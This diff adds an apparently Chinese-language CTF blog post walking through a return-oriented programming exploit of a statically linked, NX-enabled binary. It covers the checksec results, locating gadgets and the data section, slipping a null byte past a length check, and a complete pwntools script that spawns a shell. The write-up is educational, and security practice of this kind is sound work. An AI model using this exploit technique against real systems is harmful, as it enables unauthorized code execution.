@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.74.3" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>解 ROP 之工具與詳細流程&nbsp;&ndash;&nbsp;Shin&#39;s Blog</title><link rel="stylesheet" href="/css/core.min.56852e5dcac5d77dc592e9044e37cf8a2f4c0ecdb70121069de9cdf63290499e3eec4da4a5269dcc777d4703484701cd.css" integrity="sha384-VoUuXcrF133FkukETjfPii9MDs23ASEGnenN9jKQSZ4&#43;7E2kpSadzHd9RwNIRwHN"><body>
+    <div class="base-body"><section id="header" class="site header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">Shin's Blog</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/categories/">Categories</a><a class="nav item" href="/tags/">Tags</a><a class="nav item" href="/content/about.html">About</a><a class="nav item" href="https://gohugo.io/"target="_blank">Hugo</a></nav></div></span></div><div class="site slogan"><span class="title">Listening Music and Learning CS</span></div></section><div id="content"><section class="article header">
+    <h1 class="article title">解 ROP 之工具與詳細流程</h1><p class="article date">Monday, February 17, 2020</p></section><article class="article markdown-body"><h1 id="rop-writeup">ROP writeup</h1>
+<h2 id="checksec-rop">checksec rop</h2>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><h2 id="file-rop">file rop</h2>
+<pre><code>rop: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=6608f6b8f49633b8d8248f7665b6ba35659a595a, not stripped
+</code></pre><h2 id="線索1statically-linked">線索1：statically linked</h2>
+<p><strong>動態連結</strong>是當程式執行時，才會去 library binding (.so 或 .dll) <br>
+<strong>靜態連結</strong>是指程式在連結階段時，就會將使用到的函式一併放入執行檔</p>
+<table>
+<thead>
+<tr>
+<th>比較</th>
+<th>動態連結</th>
+<th>靜態連結</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>連結 library</td>
+<td>runtime 階段</td>
+<td>linking 階段</td>
+</tr>
+<tr>
+<td>連結方式</td>
+<td>建立 GOT 表</td>
+<td>與執行檔合併</td>
+</tr>
+<tr>
+<td>檔案大小</td>
+<td>較小</td>
+<td>較大</td>
+</tr>
+<tr>
+<td>libray 檔案類型</td>
+<td>.so 或 .dll</td>
+<td>.a 或 .lib</td>
+</tr>
+</tbody>
+</table>
+<p>因此我們可使用 <strong>ROPgadget</strong> 在此ELF找出 ROP gadget，來取得 執行權限</p>
+<pre><code>ROPgadget --binary rop | grep &quot;正規表達式&quot;
+</code></pre><p>補充： <code>grep</code> 是屬於 BRE 派系，使用正規表達式時，須跳脫字元。</p>
+<h2 id="線索2nx-is-enabled">線索2：NX is enabled</h2>
+<pre><code>* NX 若關閉，則可寫入 shellcode
+* NX 若開啟，則可透過 ROP chain 技巧執行 shell
+</code></pre><p>因為 NX 是開啟的，也就是說 data 段是沒有執行能力的。
+因此我們無法使用 shellcode 寫入 data 段，直接執行 shell</p>
+<p>然而，我們可以使用 ROP 技巧來執行 shell
+我們可透過 <code>readelf -S 檔案</code> 指令得知 data段 是可寫入資料的。</p>
+<h3 id="如何找-data-section-位址">如何找 data section 位址？</h3>
+<p>使用 <code>readelf -S filename</code> 指令可查看所有 section 的位址
+我們只需看 data section的部份即可 <br></p>
+<p>data區段雖然在此程式無法執行，但可寫入 <code>&quot;/bin/sh&quot;</code>字串作為納入 shell 參數的暫存區塊</p>
+<pre><code>readelf -S rop
+</code></pre><p>或是</p>
+<pre><code>readelf -S rop | grep &quot;.data&quot;
+</code></pre><p>即可知道 <code>0x6ca080</code> 是 data section 位址</p>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/b4Z45tn.png"><img  src="https://i.imgur.com/b4Z45tn.png"
+        alt/></a></p>
+<h2 id="線索3-no-canary">線索3： No canary</h2>
+<p>使用 r2 反組譯後由於 read 最多可以讀取 0xc8 (200) 個字元，
+且輸入到的 local buffer 大小只有 32 bytes，
+因此可使用 bof (buffer overflow) 技巧來建立 ROP chain。</p>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/Njh4RK9.png"><img  src="https://i.imgur.com/Njh4RK9.png"
+        alt/></a></p>
+<p>另外必須要注意，輸入字串後仍會檢查字串長度是否小於等於 32 個，
+必須在輸入30個bytes大小的字串後，額外加入 空字元，繞過strlen()的超過長度的判斷，才繼續接 ROP chain</p>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/mOn49l6.png"><img  src="https://i.imgur.com/mOn49l6.png"
+        alt/></a></p>
+<h2 id="rop-chain">ROP chain</h2>
+<p>ROP = Return Oriented Programming</p>
+<p>顧名思義，就是利用 結尾有 ret 的 gadgets (一小段 x86 組語)，繞過 NX 的保護機制，來湊成我們想要做的事情。</p>
+<p>對於 pwn ，我們就是希望可以透過 ROP chain 湊成 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>，來取得執行 shell 的系統權限。</p>
+<p>另外，在撰寫 ROP 時，必須確認該 ELF 是 x86 還是 x64，因為 兩者的 system call 的呼叫（傳參）方式不同</p>
+<ul>
+<li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/"target="_blank">參考x64 system call</a></li>
+</ul>
+<h3 id="x64呼叫慣例">x64呼叫慣例</h3>
+<pre><code>rdi: 第一個參數存放的暫存器
+rsi: 第二個參數存放的暫存器
+rdx: 第三個參數存放的暫存器
+</code></pre><p>舉例來說，呼叫 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> <br>
+暫存器會呈現</p>
+<pre><code>rax = 0x3b (system call 的編號)
+rdi = address of &quot;/bin/sh&quot;
+rsi = 0x0
+rdx = 0x0
+</code></pre><p>只要透過 ROP 將這些暫存器改成上述的值，chain結尾再呼叫 syscall，此程式在overflow之後就會執行 shell 了。</p>
+<h2 id="解法">解法</h2>
+<pre><code class="language-python=" data-lang="python=">from pwn import *
+
+r = process(&quot;./rop&quot;)
+data_sec = 0x06ca080
+gadget1 = 0x04014f6 # pop rdi ; ret
+gadget2 = 0x0401617 # pop rsi ; ret
+gadget3 = 0x047a712 # mov qword ptr [rdi], rsi ; ret
+gadget4 = 0x0442a19 # pop rdx ; pop rsi ; ret
+gadget5 = 0x044f6cc # pop rax ; ret
+syscall = 0x04003da
+
+rop =  p64(gadget1) + p64(data_sec)
+rop += p64(gadget2) + &quot;/bin/sh\x00&quot;
+rop += p64(gadget3)
+rop += p64(gadget4) + p64(0x0)*2
+rop += p64(gadget5) + p64(0x3b) 
+rop += p64(syscall)
+
+r.recvuntil(&quot;\n&quot;)
+r.send('a'*30+'\x00'+'a'*9 + rop)
+
+r.interactive()
+</code></pre></article><section class="article labels"><a class="category" href=/categories/ctf-pwn/>CTF pwn</a><a class="tag" href=/tags/ctf/>CTF</a><a class="tag" href=/tags/pwn/>pwn</a></section><section class="article navigation"><p><a class="link" href="/posts/2020/02/sast/"><span class="li">&larr;</span>靜態分析工具介紹</a></p><p><a class="link" href="/posts/2020/02/hugotut/"><span class="li">&rarr;</span>Hugo Tutorial</a class="link">
+    </p></section></div><section id="footer" class="footer"><div class="footer-wrap">
+    <p class="copyright">©2020 Notepadium.</p>
+    <p class="powerby"><span>Powered by </span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span> and the </span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p>
+</div></section><script src="/js/hljs.min.0799348a91dce12c6be4a73f943cfe78f181f4e6f6ec35c4af0fca1de377879f77cfab03c30f03a174d675737b5a9314.js" integrity="sha384-B5k0ipHc4Sxr5Kc/lDz&#43;ePGB9Ob27DXErw/KHeN3h593z6sDww8DoXTWdXN7WpMU"></script><script>hljs.initHighlightingOnLoad();</script></div>
+</body>
+
+</html>
